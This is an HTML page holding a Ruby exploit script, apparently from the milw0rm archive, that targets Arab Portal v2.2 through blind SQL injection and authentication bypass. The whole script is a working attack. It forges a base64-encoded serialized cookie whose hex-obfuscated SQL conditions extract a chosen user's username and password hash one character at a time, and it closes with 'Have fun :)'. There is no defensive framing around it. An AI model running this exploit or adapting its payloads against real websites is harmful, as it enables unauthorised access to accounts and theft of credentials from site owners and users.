<html><head><title>Arab Portal 2.2 (Auth Bypass) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/ruby

#=============================================#
#          Arab Portal v2.2 Exploit           #,
# Blind SQL Injection / Authentication Bypass #
#  Discovered &amp; written by: Jafer Al-Zidjali  #
#         Email: jafer@scorpionds.com         #
#         Website: www.scorpionds.com         #
#=============================================#

require &quot;net/http&quot;
require &quot;base64&quot;

intro=[
          &quot;+=============================================+&quot;,
          &quot;+          Arab Portal v2.2 Exploit           +&quot;,
          &quot;+ Blind SQL Injection / Authentication Bypass +&quot;,
          &quot;+  Discovered &amp; written by: Jafer Al-Zidjali  +&quot;,
          &quot;+         Email: jafer@scorpionds.com         +&quot;,
          &quot;+         Website: www.scorpionds.com         +&quot;,
          &quot;+=============================================+&quot;
          ]

def print_intro text
  w=&quot;|&quot;
  text.each do |str|
    str.scan(/./) do |c|
        STDOUT.flush
      if w==&quot;|&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;/&quot;
      elsif w==&quot;/&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;-&quot;  
      elsif w==&quot;-&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;\\&quot; 
      else
      print &quot;\b&quot;+c +w
      w=&quot;|&quot;
      end
      sleep 0.05
    end
    print &quot;\b &quot;
    puts &quot;&quot;
  end
end

print_intro intro

puts &quot;\nEnter host name (e.g. example.com):&quot;
host=gets.chomp

puts &quot;\nEnter script path (e.g. /arabportal/):&quot;
path=gets.chomp

puts &quot;\nEnter userid:&quot;
userid=gets.chomp

puts &quot;\nGetting cookie value...&quot;

http = Net::HTTP.new(host, 80)

resp= http.get(path)
cookie = resp.response[&quot;set-cookie&quot;]

len=cookie.split(&quot;; &quot;).length
max=0
login_info=&quot;&quot;

len.times do |count|
  clen=cookie.split(&quot;; &quot;)[count].length
    if clen &gt; max then 
      max=clen 
      login_info=cookie.split(&quot;; &quot;)[count]
    end
end

login_info=login_info.split(&quot;, &quot;)

if login_info[0].length &gt; login_info[1].length
login_info=login_info[0]
else
login_info=login_info[1]
end

login_info=login_info.split(&quot;=&quot;)[0]

puts &quot;Cookie name is: &quot;+login_info

puts &quot;\nWhat do you want to do?&quot;
puts &quot;1. Get username.&quot;
puts &quot;2. Get password hash.&quot;

opt=gets.chomp

if opt==&quot;1&quot;
  unamelen=0
  print &quot;\nGetting username length&quot;

  20.times do |x|
    stmt=&quot;#{userid}&quot;+
                    &quot;\x27\x20\x61\x6e\x64\x20\x6c&quot;+
                    &quot;\x65\x6e\x67\x74\x68\x28\x75&quot;+
                    &quot;\x73\x65\x72\x6e\x61\x6d\x65&quot;+
                    &quot;\x29\x3d#{x}\x20\x6f\x72\x20\x27\x27\x3d\x27&quot;

    shellcode=&quot;\x61\x3a\x35\x3a\x7b\x69\x3a\x30&quot;+
              &quot;\x3b\x73\x3a\x31\x30\x3a\x22\x61&quot;+
              &quot;\x72\x61\x62\x70\x6f\x72\x74\x61&quot;+
              &quot;\x6c\x22\x3b\x69\x3a\x31\x3b\x69&quot;+
              &quot;\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a&quot;+
              stmt.length.to_s+
              &quot;\x3a\x22&quot;+
              stmt+
              &quot;\x22\x3b\x69\x3a\x33\x3b\x69\x3a&quot;+
              &quot;\x30\x3b\x69\x3a\x34\x3b\x73\x3a&quot;+
              &quot;\x31\x3a\x22\x61\x22\x3b\x7d&quot;

    header={
                  &quot;Cookie&quot; =&gt; login_info+&quot;=&quot;+Base64.encode64(shellcode).gsub(/\s/,&quot;&quot;)
    }

    resp= http.get(path,header)
    if resp.body =~ /action=logout/
      puts &quot;\nLength is: #{x}&quot;
      unamelen=x
      break
    else
        print &quot;.&quot;
        STDOUT.flush
    end
  end 

  chars=&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;

  print &quot;\nGetting username: &quot;
  unamelen.times do |z|
    chars.scan(/./) do |c|
        stmt=&quot;#{userid}&quot;+
                        &quot;\x27\x20\x61\x6e\x64\x20\x73&quot;+
                        &quot;\x75\x62\x73\x74\x72\x69\x6e&quot;+
                        &quot;\x67\x28\x75\x73\x65\x72\x6e&quot;+
                        &quot;\x61\x6d\x65\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27\x20\x6f\x72\x20\x27\x27\x3d\x27&quot;

        shellcode=&quot;\x61\x3a\x35\x3a\x7b\x69\x3a\x30&quot;+
                  &quot;\x3b\x73\x3a\x31\x30\x3a\x22\x61&quot;+
                  &quot;\x72\x61\x62\x70\x6f\x72\x74\x61&quot;+
                  &quot;\x6c\x22\x3b\x69\x3a\x31\x3b\x69&quot;+
                  &quot;\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a&quot;+
                  stmt.length.to_s+
                  &quot;\x3a\x22&quot;+
                  stmt+
                  &quot;\x22\x3b\x69\x3a\x33\x3b\x69\x3a&quot;+
                  &quot;\x30\x3b\x69\x3a\x34\x3b\x73\x3a&quot;+
                  &quot;\x31\x3a\x22\x61\x22\x3b\x7d&quot;

        header={
                      &quot;Cookie&quot; =&gt; login_info+&quot;=&quot;+Base64.encode64(shellcode).gsub(/\s/,&quot;&quot;)
        }
        print c
        STDOUT.flush
        http = Net::HTTP.new(host, 80)
        resp= http.get(path,header)
        if resp.body =~ /action=logout/
          break
        end
        print &quot;\b&quot;
    end
  end
  puts &quot;\nHave fun :)&quot;

elsif opt==&quot;2&quot;
  chars=&quot;0123456789abcdef&quot;

  print &quot;\nGetting password hash: &quot;
  32.times do |z|
    chars.scan(/./) do |c|
        stmt=&quot;#{userid}&quot;+
                        &quot;\x27\x20\x61\x6e\x64\x20\x73\x75&quot;+
                        &quot;\x62\x73\x74\x72\x69\x6e\x67\x28&quot;+
                        &quot;\x70\x61\x73\x73\x77\x6f\x72\x64&quot;+
                        &quot;\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27&quot;+
                        &quot;\x20\x6f\x72\x20\x27\x27\x3d\x27&quot; 
        shellcode=&quot;\x61\x3a\x35\x3a\x7b\x69\x3a\x30&quot;+
                  &quot;\x3b\x73\x3a\x31\x30\x3a\x22\x61&quot;+
                  &quot;\x72\x61\x62\x70\x6f\x72\x74\x61&quot;+
                  &quot;\x6c\x22\x3b\x69\x3a\x31\x3b\x69&quot;+
                  &quot;\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a&quot;+
                  stmt.length.to_s+
                  &quot;\x3a\x22&quot;+
                  stmt+
                  &quot;\x22\x3b\x69\x3a\x33\x3b\x69\x3a&quot;+
                  &quot;\x30\x3b\x69\x3a\x34\x3b\x73\x3a&quot;+
                  &quot;\x31\x3a\x22\x61\x22\x3b\x7d&quot;
        header={
                      &quot;Cookie&quot; =&gt; login_info+&quot;=&quot;+Base64.encode64(shellcode).gsub(/\s/,&quot;&quot;)
        }
        print c
        STDOUT.flush
        http = Net::HTTP.new(host, 80)
        resp= http.get(path,header)
        if resp.body =~ /action=logout/	
          break
        end
        print &quot;\b&quot;
    end
  end
  puts &quot;\nHave fun :)&quot;
end

# milw0rm.com [2009-08-07]</pre></html>